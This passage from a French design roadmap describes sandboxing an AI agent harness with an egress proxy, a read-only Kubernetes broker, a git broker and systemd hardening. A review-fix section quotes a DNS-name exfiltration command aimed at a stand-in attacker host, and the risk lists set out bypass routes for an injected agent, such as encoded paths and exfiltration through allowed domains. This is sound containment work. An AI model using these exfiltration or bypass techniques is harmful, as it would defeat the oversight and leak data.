| Résolution | La zone agent **ne résout plus** (`getent hosts` échoue) et la requête proxifiée aboutit quand même : c'est le proxy qui résout. |
| Options de script | `opts.set(..., defer=True)` : les `--set` de la CLI sont différés **après** le chargement des scripts, donc une option définie par l'addon est réglable depuis l'unité. |
| Corps | `stream_large_bodies` n'existe plus en v12 (vérifié par `mitmdump --help`) : les corps ne sont pas retenus, et la borne mémoire est `MemoryMax=` côté systemd. |
| Accumulation des flux | Mesuré : **1 000 requêtes refusées → +0,6 Mo de RSS** (≈0,6 Ko par flux, 200 req/s). Pas d'accumulation qui condamne un service au long cours ; `MemoryMax` reste la borne. |
| `is_private` et le CGNAT | **Inerte** pour `100.64.0.0/10` sur l'interpréteur du proxy (3.12.14 : `is_private=False`, comme sur 3.14.4, alors qu'il vaut `True` pour 192.168/16). La plage RFC 6598 est donc nommée explicitement — `is_global` seul ne suffirait pas non plus, il vaut `True` pour le multicast. |
| Retrait de la CA | `update-ca-certificates` seul **laisse des liens cassés** dans `/etc/ssl/certs` — le lien nommé *et* le lien de hachage (`find /etc/ssl/certs -xtype l`). Le retrait passe donc par `--fresh`, qui reconstruit tout. |

**Niveau 2, vérifié à son tour.** La CA est générée **au démarrage** du service — pas à la première interception — dans le `confdir` de la zone de confiance : c'est ce qui rend l'ordre du rôle honnête (démarrer, constater la CA, la publier). `update-ca-certificates` la pose dans `/etc/ssl/certs` et les clients l'acceptent **sans `-k`**. Le test qui distingue les deux niveaux est l'émetteur présenté au client : **l'émetteur réel du site** au niveau 1, `CN=mitmproxy` au niveau 2. La clé privée reste en `0600` dans le home de la zone de confiance, illisible par la zone agent. Repasser en niveau 1 **retire la CA du store système mais garde la clé** : la CA reste stable, donc aucune redistribution à chaque bascule.

**Persistance, bascules et réversibilité, vérifiées** : après reboot, les trois services remontent, le proxy écoute sur `127.0.0.1:8080`, le filtre nftables est chargé et l'allowlist s'applique — le port amont du gateway reste fermé. `agent_egress_proxy_enabled: false` retire unité, config, venv, profil **et** la CA, et rend à la zone agent son état de socle (aucun egress, aucune résolution) sans toucher au gateway. Deuxième passage du play : **aucun `changed`** sur le rôle. Repasser du niveau 2 au niveau 1 retire la CA du store et rend l'émetteur réel du site.

**Corrigé après une review externe.** La **résolution DNS avait lieu avant la vérification de l'allowlist** : le proxy résolvait donc tout nom que l'agent lui soumettait, y compris hors allowlist, et lui offrait de ce fait un canal de sortie par les noms de requête (le `curl -x … http://<données>.c2.attacker.com` sortait vraiment, puis se faisait refuser). L'allowlist est désormais évaluée **d'abord et sans toucher au réseau** ; la résolution ne sert plus qu'aux hôtes autorisés, où elle garde son rôle anti-rebinding. Trois corollaires : un nom autorisé mais non résolvable porte la raison `unresolved` (et non `internal`, qui doit rester le signal d'une sonde vers le LAN) ; la correspondance de chemin se fait sur des **frontières de segment** (`/v1` n'autorise plus `/v1-secret` et autorise `/v1` lui-même), et sur le **chemin que l'origine résoudra** : la query string est retirée — `Request.path` la porte, donc `/v1/search?q=1` était refusé à tort — et les segments `.`/`..`, encodés compris, sont résolus, sans quoi `/v1/../admin` franchissait une règle `/v1` pour atteindre `/admin` en amont (résidu : un amont qui décoderait **deux fois**, `%252e%252e`, reste hors de portée) ; et un **pré-vol** valide l'allowlist dans `pre_tasks`, avant la levée du filtre — le rôle échouait sinon au milieu du play, filtre levé (le reste de la fenêtre de la Phase 1 reste ce qu'il était : c'est le `make audit` de la Phase 7 qui la rend détectable).

**Un point de cette review est rejeté, mesure à l'appui :**

| Point | Ce qui a été mesuré |
|---|---|
| Conditionner le chown récursif du venv à l'installation (« 20 à 40 s par run ») | **0,65 s** mesurés sur le venv de mitmproxy, 1,21 s pour celui de litellm (≈20 000 fichiers) au même run. Même rejet qu'en Phase 2, et pour la même raison : gater sur la version laisserait un `broker_name` modifié sans accès groupe — panne silencieuse. |

**Risques résiduels, consignés :**

1. **TOCTOU de résolution** : l'addon résout pour contrôler, mitmproxy résout pour connecter. Une réponse DNS qui changerait entre les deux échapperait au contrôle — négligeable dans une sandbox mono-agent, mais c'est écrit.
2. **Niveau 2 et `certifi`** : les outils qui appellent `certifi.where()` directement ne lisent ni le store système ni `SSL_CERT_FILE`. À traiter avec la Phase 8, sur le venv du harnais.
3. **Point de panne unique** pour l'egress web : `Restart=always`, et l'absence de repli est la propriété recherchée, pas un défaut.
4. **`getaddrinfo` bloque la boucle d'événements** le temps d'une résolution, et **le cache par hôte croît avec les hôtes autorisés** : négligeable en allowlist stricte, ~1-2 Mo pour 10 000 domaines sous `*`, et borné par `MemoryMax`. À revoir si mitmproxy expose un jour un hook de résolution.
5. **La politique est déclarative** : l'agent peut atteindre tout ce que l'allowlist déclare. Un domaine autorisé reste un canal d'exfiltration — c'est la Phase 7 (alerte sur volume) qui porte cette limite, pas le proxy.
6. **Un conteneur n'atteint le proxy qu'en `--network=host` — et sous `runsc`, ce flag seul ne suffit pas** (mesuré en Phase 4, détail au tableau des mesures de cette phase) : il faut **deux** flags indépendants, celui de Podman (partager le netns de l'hôte) *et* celui de runsc (`--runtime-flag network=host`, hostinet au lieu du netstack). Sans le second, le sandbox se retrouve **sans aucune interface** et `127.0.0.1` n'est joignable par personne. Avec son propre netns, `127.0.0.1:8080` est de toute façon *son* loopback. Le proxy sert le harnais nu ; un conteneur qui a besoin du web passe par les deux flags.

**Ce qui reste dehors, et pourquoi :**

- **Injection de credential** par le proxy : c'est le patron des brokers (Phase 5), et ce serait un secret de plus à faire vivre. Le proxy sert l'egress web générique.
- **Inspection de contenu** : le niveau 2 rend les corps visibles, il ne les juge pas. La journalisation ne les enregistre pas — la Phase 7 décidera de ce qui mérite d'être conservé, et où.
- **Ne jamais router les jetons des brokers** (k8s, git) à travers ce proxy : ils ont leurs propres exceptions d'egress et leurs propres brokers. Le `NO_PROXY` du profil exclut le loopback pour la même raison (le gateway d'inférence n'y passe pas).

### Extensions optionnelles

> Chaque extension ajoute un broker à la zone de confiance. **Aucune n'est requise** : un agent purement conversationnel n'a besoin ni de l'une ni de l'autre.

#### ✅ Phase 4 — Broker Kubernetes (lecture seule) *(faite)*

Cas d'usage : agent SRE. **Pas de MITM, pas de CA interne** — le harnais parle en HTTP clair à un port loopback, le broker fait le TLS en amont.

Implémentation : **`kubectl proxy`** (`k8s-broker.service`, `k8s_broker_enabled`), sous l'utilisateur de la zone de confiance. Aucun code à écrire : il fait le TLS amont, suit les `watch` (flux longs, qu'un reverse proxy naïf bufferiserait) et porte déjà le filtre de requêtes. Comme le proxy L7 en Phase 3, c'est l'outil existant plutôt qu'une réimplémentation.

**Le RBAC vit sur le cluster, pas dans ce dépôt.** Le projet ne possède pas le cluster et n'a aucune raison de laisser un kubeconfig d'admin sur le poste : le rôle **livre** le manifeste (`roles/k8s_broker/files/k8s-broker-rbac.yaml` — Namespace, ServiceAccount, ClusterRole, binding, Secret de jeton), le déploiement le pose, et le README donne les commandes qui produisent le kubeconfig que le play consomme.

- [x] **La VM agent n'est pas un nœud k3s** — vérifié (aucun binaire kube, aucun `/etc/rancher`, aucune unité), **et le rôle l'assère** : le kubeconfig d'un serveur k3s est cluster-admin, un broker alimenté avec lui livrerait le cluster à l'agent.
- [x] ServiceAccount + ClusterRole **explicite** (jamais le `view` intégré, dont le contenu bouge entre versions) :

```yaml
kind: ClusterRole
metadata: { name: sre-readonly }
rules:
  # The archetypal SRE questions: why is this pod pending, why is this volume unbound.
  - apiGroups: [""]
    resources: ["pods","services","endpoints","configmaps","nodes","namespaces","events",
                "persistentvolumeclaims","persistentvolumes","limitranges","resourcequotas",
                "serviceaccounts"]
    verbs: ["get","list","watch"]
  - apiGroups: [""]
    resources: ["pods/log"]
    verbs: ["get"]
  - apiGroups: ["apps","batch","networking.k8s.io","apiextensions.k8s.io"]
    resources: ["*"]
    verbs: ["get","list","watch"]
  - apiGroups: ["discovery.k8s.io","autoscaling","policy","storage.k8s.io","coordination.k8s.io"]
    resources: ["*"]
    verbs: ["get","list","watch"]
  # Store paths, never values. The stores and generators are deliberately absent.
  - apiGroups: ["external-secrets.io"]
    resources: ["externalsecrets"]
    verbs: ["get","list","watch"]
  - apiGroups: ["metrics.k8s.io"]
    resources: ["*"]
    verbs: ["get","list"]
# NI secrets, NI pods/exec|portforward|attach, NI impersonate, aucun write.
```

  Livré tel quel dans `roles/k8s_broker/files/k8s-broker-rbac.yaml` (Namespace, binding et Secret de jeton compris) : à poser par l'ansible de cluster du déploiement.

- [x] Vérification côté cluster : `kubectl auth can-i --list --as=system:serviceaccount:<ns>:<sa>` — le seul contrôle qui dise ce que le jeton fait réellement (README §4). Cette sortie contient aussi un verbe **`create`** sur les trois `selfsubject*reviews` : c'est `system:basic-user`, lié à tout le monde par défaut, et ça ne change aucun état — ça répond à « ai-je le droit de… ». À ne pas confondre avec un droit d'écriture en lisant la liste.
- [x] **Jeton long** (Secret `service-account-token`, créé à la main depuis 1.24) : la rotation, c'est régénérer le kubeconfig et relancer le play. Le « 15 min + timer + reload » envisagé ici est une **impasse** — pour frapper un jeton il faut un credential, et le seul que le broker accepterait de détenir *est* le jeton : un jeton court ne ferait que déplacer le secret d'amorçage d'un cran.
- [x] Kubeconfig du broker en **`0640 root:{{ user }}`** dans le home de la zone de confiance (0700), **illisible par la zone agent**. Le `0600` prévu ici ne marchait pas : contrairement à `EnvironmentFile`, lu par systemd **en root avant** la baisse de privilèges, c'est `kubectl` qui lit ce fichier.
- [x] Unité systemd `kubectl proxy` durcie, `--address=127.0.0.1` et `MemoryMax=` :

```bash
kubectl proxy --port=<port> --address=127.0.0.1 --kubeconfig=<kubeconfig> \
  --reject-methods='POST,PUT,PATCH,DELETE' \
  --reject-paths='^/api/.*/(pods|services|nodes)/.*/(exec|attach|portforward|proxy),^/api/.*/secrets,^/apis/.*/secrets'
Restart=always
MemoryMax=<borne>
```

  `--reject-paths` **remplace** les motifs par défaut (qui ne couvrent que `exec`/`attach`) → les réinclure, et y ajouter `portforward`, `secrets` et le sous-chemin **`proxy`** des pods, services et nœuds — ce dernier fait poster l'API server vers un service interne, et même si le RBAC ne l'accorde pas, il relève du même filtre que `exec`. `--accept-hosts` **n'est pas touché** : le défaut est le loopback seul, et le port est retiré avant le match — l'élargir à `.*` aurait affaibli le contrôle sans rien résoudre. `MemoryMax=` n'est pas décoratif : c'est la seule borne mémoire du proxy (les corps ne sont pas retenus par `kubectl proxy`, mais rien ne borne le nombre de `watch` ouverts).
- [x] Kubeconfig de la zone agent : `server: http://127.0.0.1:<port>`, `token: ignore` — une **adresse**, aucun secret. C'est ce que l'image du harnais consomme.
- [x] **Deux couches indépendantes, plus une troisième** : `--reject-methods` rend le proxy read-only, le RBAC rend le jeton read-only, les chemins sensibles sont refusés. Le filtre de chemins est best-effort par nature : **le RBAC est le contrôle réel.**
- [x] `k8s_broker_enabled: false` retire unité, binaire et kubeconfigs (celui du broker **et** celui de la zone agent) : le jeton ne survit pas au composant qui l'utilisait.

**Ce que les mesures ont établi** — deux défauts ouverts par défaut, qui ne se voient pas à l'œil nu :

| Point | Résultat mesuré |
|---|---|
| `--reject-methods` par défaut | **`^$` — ne rejette rien.** Le « POST,PUT,PATCH » du plan est l'*exemple* de l'aide, pas le défaut, et il n'inclut pas `DELETE`. Le drapeau n'est pas un durcissement facultatif : sans lui le proxy laisse tout passer. |
| `--reject-methods` = liste de regex | Séparées par des virgules et compilées une par une, match **non ancré** : une alternance `^(POST\|PUT)$` serait découpée en regex invalides et le proxy mourrait au démarrage. Liste simple uniquement. |
| `--reject-paths` par défaut | `^/api/.*/pods/.*/exec,^/api/.*/pods/.*/attach` : ni `portforward`, ni `secrets`. Le poser **remplace** ces motifs. |
| `--accept-hosts` par défaut | Loopback seulement, et le port est **retiré** avant le match (`net.SplitHostPort`) : `Host: 127.0.0.1:8001` passe. La piste « ajouter `--accept-hosts='.*'` si un 403 apparaît » était donc à la fois inutile et affaiblissante. |
| Kubeconfig lu par le service | `0600 root:broker` **ne marche pas** (voir ci-dessus) : `0640 root:broker`, même forme que le `config.yaml` du gateway. |
| `/version` comme contrôle d'effet | **Ne prouve rien** : `system:public-info-viewer` est lié à `system:authenticated` **et** à `system:unauthenticated`. Le contrôle d'effet porte sur `/api`, refusé à un appelant anonyme — un port qui écoute ne prouve pas que le jeton authentifie. |
| En-têtes entrants | L'`Authorization` de l'agent est **écrasé** par le credential du kubeconfig ; en revanche `Impersonate-*` serait transmis → refusé par le RBAC, qui n'a aucun droit d'impersonation. |
| Paquet `kubernetes-client` | **Aucun candidat** sur Ubuntu 26.04 : le binaire vient de `dl.k8s.io`, épinglé **version et sha256** (`get_url: checksum:`) — le seul téléchargement du dépôt qui vérifie son artefact, et l'idempotence vient de là (pas de `stat`). |
| Conteneur de la zone agent | Un conteneur n'atteint le broker qu'avec **deux flags**, pas un : `--network=host` (Podman partage le netns de l'hôte) **et** `--runtime-flag network=host` (runsc utilise hostinet au lieu de son netstack). Mesuré : sous `runsc` avec Podman seul, le sandbox n'a **aucune interface** (`ip -o addr` vide, `Network unreachable`) — sous Podman rootless, runsc n'a pas les permissions pour reconfigurer le netns et retire les IP des interfaces ([gVisor #9398](https://github.com/google/gvisor/issues/9398)). Avec les deux flags : `lo` + `eth0` visibles, broker joignable, et **le filtre tient** — `10.20.4.10:6443` et `1.1.1.1` expirent toujours. Le second flag peut être livré globalement par le rôle `podman_gvisor` dans son enveloppe `runsc` (`podman_gvisor_hostinet`), mais il est **désactivé par défaut** : il basculerait *tous* les conteneurs en hostinet, y compris ceux qui n'ont jamais demandé le réseau de l'hôte. Le chemin étroit — recommandé — est `--runtime-flag network=host` sur le seul conteneur concerné, au même endroit que `--network=host` dans la config du harnais. (`[engine.runtimes_flags]` dans `containers.conf` ferait la même chose que le wrapper, mais cette table n'existe qu'à partir de podman 5.6 et serait **ignorée en silence** avant — d'où le wrapper, qui ne dépend d'aucune version.) Une virtual IP routable a été écartée : elle exigerait d'ouvrir une exception non-loopback dans le ruleset de la Phase 1, là où les flags n'en demandent aucune. |
| Filtre vérifiable **sans cluster** | Le filtre décide **avant** l'amont : avec un kubeconfig pointant sur un port mort, `403` = refus du filtre et `500` = requête laissée passer. Toute la pile a donc été vérifiée avant même d'avoir le kubeconfig : `DELETE`/`POST` 403, `secrets` 403 (les deux préfixes), `pods/exec` 403, `nodes/*/proxy` 403, `services/*/proxy` 403, `Host` étranger 403 — et `GET /api`, `pods/log` en **500**, donc bien laissés passer. |
| Cache de `kubectl proxy` | **Aucune écriture** dans `$HOME/.kube` : le proxy ne construit pas de client de découverte, son journal ne porte que « Starting to serve » et les erreurs d'amont. Le dossier reste donc **root:broker 0750**, comme les autres composants : le service ne peut pas remplacer le kubeconfig qu'il lit. |

**Ce qui reste dehors, et pourquoi :**

- **Appliquer le RBAC depuis le play** : non — le dépôt ne possède pas le cluster, et le faire exigerait d'y laisser un kubeconfig d'admin. Le manifeste est livré, la pose appartient au déploiement.
- **Renouvellement de jeton par le broker** : non — voir la case sur la durée de vie.
- **`kubectl` dans la zone agent** : non — le harnais exécute ses commandes dans un conteneur isolé, donc c'est le binaire de **l'image** qui sert ; un binaire nu dans la zone agent ne serait jamais utilisé. Le rôle n'installe que celui du broker (`/opt/k8s-broker/bin`, 0750, hors de portée de la zone agent).
- **Un ClusterRole « plus fin »** (namespaces nommés, ressources limitées) : c'est une décision de déploiement, pas un défaut du projet — le manifeste livré est le point de départ, à rétrécir si le cas d'usage le demande.

**Ce que `--network=host` ouvre et ce qu'il ne touche pas** — mesuré, parce que la question revient à chaque harnais conteneurisé :

| | Résultat |
|---|---|
| Filtre uid/subuid | **Tient** : le VIP du cluster, `1.1.1.1` et **le port d'Ollama** (fermé en Phase 2) expirent tous depuis le conteneur en `--network=host`. |
| Capabilities du sandbox | `CapEff=0x800405fb` : **ni `NET_RAW` ni `NET_ADMIN`** — pas de sockets brutes (donc pas d'écoute du trafic), pas de modification du pare-feu ni des interfaces de l'hôte. |
| Loopback de l'hôte | **Ouvert** : le conteneur joint le broker, le gateway et le proxy, et — mesuré — il peut **y écouter** (`python -m http.server` sur `127.0.0.1:9999` → 200 depuis l'hôte). UFW ne couvre pas le loopback. |
| Sans `--network=host`, avec hostinet seul | **Son propre loopback** : `127.0.0.1:8001` est refusé. Le drop-in global n'ouvre donc rien par lui-même — c'est la moitié Podman du couple qui déplace la frontière, par conteneur et explicitement. |
| `runsc network=host` (hostinet) | Delta d'isolation : les sockets du sandbox sont celles du **noyau de l'hôte** au lieu du netstack de gVisor — la doc gVisor le dit, ce mode « decreases the isolation to the host ». L'interposition des syscalls, elle, reste. **Et ce delta vaut même sans `--network=host`** : un conteneur dans son propre netns garde son loopback, mais ses paquets sont parsés par la pile du noyau — c'est une **surface d'attaque**, pas une joignabilité. D'où le défaut à `false`. |

**Règle qui en découle.** Sous host networking, le loopback de la VM cesse d'être privé : c'est un domaine partagé avec la zone agent. Donc **tout nouveau service qui s'écoute en loopback doit soit figurer dans `agent_egress_blocked_loopback_ports`, soit authentifier ses appelants** — le port du provider (Phase 2) et le blocage DNS (Phase 1) en sont les deux instances actuelles, le broker et le proxy les portes assumées.

**Risques résiduels, consignés :**

1. **Le filtre de chemins est best-effort** : une requête encodée (`%73ecrets`) peut le franchir. Le RBAC est le contrôle réel — et il n'accorde ni `secrets` ni `pods/exec`.
2. **Les en-têtes `Impersonate-*` sont transmis** par le proxy et refusés par le RBAC : un ClusterRole qui accorderait `impersonate` ouvrirait une escalade. À ne jamais accorder.
3. **Un jeton long dans un home en 0700** : la surface restante est la VM elle-même. Rotation = régénération du kubeconfig + relance du play.
4. **Un nouveau chemin loopback pour l'agent** (`127.0.0.1:8001`), comme les routes d'admin du gateway : la Phase 7 doit le connaître.
5. **Le broker est le seul chemin vers le cluster** : `Restart=always`, et l'absence de repli est la propriété recherchée, pas un défaut.
6. **« Aucun accès aux objets `Secret` » ne veut pas dire « aucune donnée sensible »** : les variables d'environnement d'un pod (`get pods -o yaml`), les ConfigMaps de `kube-system`, et surtout les **logs** (`pods/log`, accordé — un agent SRE en a besoin) contiennent régulièrement des jetons, des chaînes de connexion ou des variables dumpées au démarrage. Le ClusterRole est cluster-wide : c'est le prix d'un agent SRE, assumé, mais c'est une surface d'exfiltration — bornée par le proxy L7 (Phase 3) et par l'alerte sur volume (Phase 7).

**Corrigé après une review externe.** Trois défauts réels : `MemoryMax=` était défini dans les variables et documenté, mais **absent de l'unité** — une variable morte, et aucune borne mémoire ; la sonde `uri` du contrôle d'effet pouvait être routée par un `HTTP_PROXY` présent dans l'environnement de la cible (d'où `use_proxy: false`) ; le filtre de chemins laissait passer les **sous-ressources `proxy`** des pods, services et nœuds, qui font poster l'API server vers un service interne. Le ClusterRole a par ailleurs été élargi aux API qu'un agent SRE lit réellement : `endpointslices` (que `kubectl describe svc` appelle), autoscalers, disruption budgets, storage classes, leases.

**Trois points rejetés, mesures et principe à l'appui :**

| Point | Ce qui a été mesuré |
|---|---|
| `--cache-dir` forcé sous le home (« kubectl écrit son cache dans `$HOME/.kube/cache`, refusé en 0750 root ») | **Aucune écriture de cache** : `kubectl proxy` ne construit pas de client de découverte — le cache appartient aux commandes `kubectl get`, pas au proxy. Le dossier reste **root:broker 0750**, la forme des autres composants. |
| Table de checksums par architecture (amd64 **et** arm64) | Le projet **provisionne de l'amd64** (`ubuntu-26.04-server-cloudimg-amd64`), et `runsc` comme `uv` sont déjà figés en `x86_64`. Une table serait de la machinerie pour une plateforme que le dépôt ne déploie pas ; **une assertion** le dit en trois lignes, avec un message qui dit quoi faire. |
| `apiGroups: ["*"]` pour couvrir les CRDs d'un coup | Refusé : cette règle lirait aussi **chaque futur CR** et chaque sous-ressource de chaque groupe, sans que le fichier ne le dise — alors que le RBAC est précisément le contrôle sur lequel ce design s'appuie. Le manifeste montre comment **nommer** ses groupes, et `apiextensions.k8s.io` donne déjà la carte des CRDs présents. |

#### 🌟 Phase 5 — Broker git (propositions de PR)

Généralisable à toute forge en HTTP (Forgejo/Gitea, GitLab…) ; l'injection est templatée par forge, car les formats d'authentification diffèrent.

- [ ] **Compte dédié sur la forge**, avec accès au **seul** dépôt visé. Indispensable : les PAT Forgejo/Gitea **ne se scopent pas par dépôt** — un token `write:repository` écrit dans *tous* les dépôts de son propriétaire. Le cloisonnement ne peut venir que du compte. Vérifier si la version supporte des tokens scopés finement, mais ne pas en dépendre.
- [ ] Proxy d'injection en zone de confiance, loopback. **Attention au format d'authentification** : git attend du *basic*, l'API attend `token <...>` → deux `location` :

```nginx
server {
    listen 127.0.0.1:<port>;

    # git (clone / fetch / push) — écrase tout Authorization entrant
    location ~ ^/<owner>/<repo>\.git/ {
        proxy_pass {{ git_broker_upstream }};
        proxy_set_header Host {{ git_broker_host }};
        proxy_set_header Authorization "Basic <base64(user:TOKEN)>";
        proxy_ssl_trusted_certificate {{ git_broker_ca }};
        client_max_body_size 0;        # sinon un push volumineux échoue (défaut : 1 Mo)
        proxy_request_buffering off;
        proxy_read_timeout 3600s;
    }

    # API (PR, issues, statut CI)
    location /api/ {
        proxy_pass {{ git_broker_upstream }}/api/;
        proxy_set_header Host {{ git_broker_host }};
        proxy_set_header Authorization "token <TOKEN>";
        proxy_ssl_trusted_certificate {{ git_broker_ca }};
    }
}
```

- [ ] Config git de la zone agent : remote vers le proxy loopback, **aucun credential helper**, **aucune clé SSH** dans le home — `git+ssh` est à proscrire, aucun proxy L7 ne peut intercepter SSH (l'authentification se fait *à l'intérieur* du canal chiffré). Le harnais garde un `git` 100 % natif : `clone`, `checkout -b`, `commit`, `push`.
- [ ] **Protection de branche** — c'est le contrôle porteur de tout le design, il tient même si l'agent contourne le proxy : PR obligatoire, approbation obligatoire, push direct interdit, force-push interdit. Protéger aussi les tags.
- [ ] **Validation en CI sur la PR** : `kustomize build`, `kubeconform`, `conftest`/OPA, en statut requis. Le gate est dans la CI, pas dans un script broker.
- [ ] Interdire la modification du pipeline lui-même (workflows CI, bootstrap GitOps, manifests RBAC) sans revue supplémentaire — sinon un PR mergé escalade en modifiant le déploiement.

### Hygiène

#### 🌟 Phase 6 — Chaîne d'approvisionnement

- [ ] **`runsc` est téléchargé depuis `.../release/latest/...` sans `checksum:`** (non épinglé, non vérifié) → épingler la version + `checksum:`. Idem pour les installeurs `uv` et NVM.
- [ ] Images conteneurs : épingler les digests ; envisager un miroir interne + politique `cosign`.
- [ ] Les `pip install` / `npm install` sont un point d'entrée pour un agent injecté : au minimum les journaliser, idéalement les restreindre à un miroir. Concerne aussi **`npm update -g`**, que `nvm` lance **sans condition à chaque run** (constaté en Phase 1) — c'est ce qui oblige à lever le filtre d'egress pendant le provisioning.

#### 🌟 Phase 7 — Observabilité & vérifications

À faire **avant** d'installer le harnais (Phase 8) : rien ne doit tourner sans être audité.

- [ ] Règles auditd `execve` sur l'uid du harnais : rend visible l'exploitation d'une injection en RCE.
- [ ] Logs des composants de la zone de confiance **et du proxy L7** → cible commune, **non inscriptible par la zone agent**. Principal artefact de détection d'exfiltration — **piste d'audit des prompts comprise**, que le gateway ne fournit pas aujourd'hui (`DETAILED_DEBUG` n'est qu'un flux de débogage, 135 lignes par requête). Le proxy produit déjà sa part (une ligne de politique par requête, `egress-allow`/`egress-deny`) : reste à l'expédier.
- [ ] Expédition distante des logs (une VM compromise ne doit pas pouvoir effacer ses traces).
- [ ] Auditer ce que les routes d'admin du gateway exposent à l'agent (`/health`, `/metrics`, `/key/*`) : chemin connu depuis la Phase 2, impact faible sans base de données, mais c'est un chemin que l'agent a.
- [ ] `make audit` qui **assère** l'état réel : règles d'egress (et **table `agent_egress` chargée** — sans quoi un run interrompu laisse la zone agent ouverte sans le dire), UFW, **`inference-gateway` actif sous l'utilisateur de la zone de confiance**, durcissement des unités, absence de credential hors zone de confiance.
- [ ] Alerting sur anomalies (nouvelle destination, upload volumineux, nouveau processus).

### Harnais

#### 🌟 Phase 8 — Installation et sécurisation du harnais

**Périmètre.** Le socle ne présuppose rien du harnais et **ne l'installe pas** : il sécurise l'environnement d'exécution autour de lui. L'installation est déléguée à un **provider interchangeable**, sur le même patron que la table d'alias pour l'inférence.

- `harness_provider: "hermes"` → le rôle `harness_hermes` livré par le projet installe le harnais et définit `harness_exec_start` par défaut.
- `harness_provider: "none"` → installation manuelle : le déployeur installe son harnais et renseigne `harness_exec_start`.
- Un `harness_exec_start` explicite **l'emporte toujours** sur le défaut du provider.

**Ajouter la compatibilité d'un autre harnais** — le chemin prévu, pas un contournement : ajouter `roles/harness_<nom>/` qui installe le harnais et pose `harness_exec_start`, puis `harness_provider: "<nom>"`. Le rôle `harness_service` reste **inchangé** : c'est ce découpage qui garde le socle agnostique. Le projet ne livre que `hermes`, volontairement.

**Pourquoi cette phase en dernier.** L'unité systemd n'est le prérequis d'aucune autre phase : le contrôle d'egress (Phase 1) travaille sur l'**uid**, pas sur le service. La déplacer ici permet d'écrire un `ExecStart` qui pointe sur quelque chose de réellement installé, et de vérifier le durcissement obtenu sur une unité qui démarre.

- [ ] **Créer le rôle `harness_hermes`** — il n'existe pas aujourd'hui : `hermes` n'apparaît dans le dépôt que comme *nom* (défaut de `harness_name`, exemple du README), jamais comme installation. Rôle à concevoir **au moment de cette phase** et pas avant : il n'est le prérequis d'aucune autre, et ses deux paramètres déterminants ne sont pas connus à ce stade.
  - À trancher alors : le **mécanisme d'installation** (dépôt git à cloner, `uv tool install` / `pipx` / `npm -g`, binaire…) et l'**entrypoint** réel (`harness_exec_start`).
  - Il doit installer dans la zone agent et poser `harness_exec_start` + `harness_workdir` par défaut. **Seul provider livré**, volontairement.
- [ ] Documenter la convention de provider (§ ci-dessus) et les **exemples** d'`harness_exec_start` pour d'autres harnais — en commentaire, jamais comme défaut.
- [ ] Rôle `harness_service` : unité `{{ harness_name }}.service`, tout en variables. Indépendant du provider.

```ini
[Unit]
Description=AI Agent Harness ({{ harness_name }})
After=network-online.target

[Service]
Type=simple
User={{ harness_name }}
Group={{ harness_name }}
WorkingDirectory={{ harness_home }}
ExecStart={{ harness_exec_start }}      # ex. /usr/local/bin/uv run python main.py
Restart=always
RestartSec=5

# Sandboxing systemd strict
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths={{ harness_home }}/workspace
PrivateTmp=true
PrivateDevices=true
ProtectProc=invisible
ProcSubset=pid
NoNewPrivileges=true
CapabilityBoundingSet=
ProtectKernelTunables=true
ProtectControlGroups=true
RestrictNamespaces=true
RestrictRealtime=true
RestrictSUIDSGID=true
RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6
SystemCallFilter=@system-service
SystemCallArchitectures=native
LockPersonality=true
RemoveIPC=true
UMask=0077
MemoryMax=8G
CPUQuota=400%
TasksMax=2048

# Egress : loopback uniquement — complète la Phase 1 (survit aux changements d'uid)
IPAddressDeny=any
IPAddressAllow=localhost

[Install]
WantedBy=multi-user.target
```

- [ ] **Le harnais exécute ses commandes dans un conteneur** (constat de la Phase 4) : l'outillage vit donc dans **l'image**, pas dans la zone agent — un `kubectl` installé nu ne servirait à rien. C'est l'image qui porte le client du broker, et elle n'atteint les services loopback (broker, proxy L7) qu'en `--network=host`, avec le `$HOME` du harnais monté (kubeconfig bidon, variables de proxy). À trancher ici : le provider livre-t-il une image par défaut, ou documente-t-il seulement la recette ?
- [ ] **Reprendre l'environnement du proxy dans l'unité** : `HTTP_PROXY`/`HTTPS_PROXY`/`NO_PROXY` et, au niveau 2, `SSL_CERT_FILE`/`REQUESTS_CA_BUNDLE`/`NODE_EXTRA_CA_CERTS`. `/etc/profile.d` n'atteint ni une unité systemd ni une session SSH non interactive (`ssh harnais@vm "curl …"`) — le fichier de profil de `agent_egress_proxy` ne sert qu'aux sessions interactives. À vérifier aussi : que la pile HTTP du harnais honore réellement ces variables.
- [ ] Mettre à jour le sudoers scopé (`systemctl restart {{ harness_name }}`) : déployé par `harness_user`, il référence une unité qui n'existe qu'à partir d'ici.
- [ ] `security_hardening` copie les `authorized_keys` de l'admin vers le harnais (même clé pour `ubuntu@` **et** `{{ harness_name }}@`) : rendre ce comportement **optionnel**, et documenter que ça fusionne les identités.
- [ ] **Vérifier le durcissement obtenu** : `systemd-analyze security {{ harness_name }}.service`, avec un score cible documenté. (C'est le bon endroit pour cette mesure : elle porte sur l'unité créée ici.)
- [ ] `harness_service_enabled: false` doit laisser la VM dans son état actuel (la sandbox complète, sans service).

### Outillage

#### 🌟 Phase 9 — Raccourcis développeur (`Makefile`)

- [ ] `make deploy` : `tofu apply` puis `ansible-playbook`.
- [ ] `make lint` : `tofu fmt -check`, `tofu validate`, `ansible-lint`.
- [ ] `make ssh` : SSH en tant que harnais.
- [ ] `make restart` : redémarre le service du harnais (nécessite la Phase 8).
- [ ] `make audit` : lance les vérifications de la Phase 7.

---

## 🚫 4. Décisions écartées (et quand les revisiter)

| Écarté | Raison | Condition de retour |
|---|---|---|
| Interception TLS (MITM) **par défaut** | Coût de distribution de la CA dans tous les trust stores (système, `certifi`, `NODE_EXTRA_CA_CERTS`, git, kubeconfig) + cert pinning cassé. | **Retenue comme niveau 2 opt-in** (Phase 3), pas comme défaut. Le niveau 1 (allowlist) couvre la majorité des cas. |
| Résolveur DNS en zone de confiance | Annoncé en Phase 1, il ne sert rien : un client derrière un proxy *forward* envoie le **nom** dans sa requête CONNECT, c'est le proxy qui résout. Et un client qui résoudrait pour se connecter lui-même n'a de toute façon aucune IP hors loopback à joindre — il échouerait après avoir résolu. Un composant de plus pour zéro capacité. | Le jour où un client exigerait une résolution préalable **et** un chemin réseau hors loopback qui ne passe pas par le proxy. |
| Migration complète UFW → nftables | UFW gère bien l'ingress, est déployé, et fail2ban utilise son action `ufw`. | Jamais nécessaire : les deux coexistent (Phase 1). |
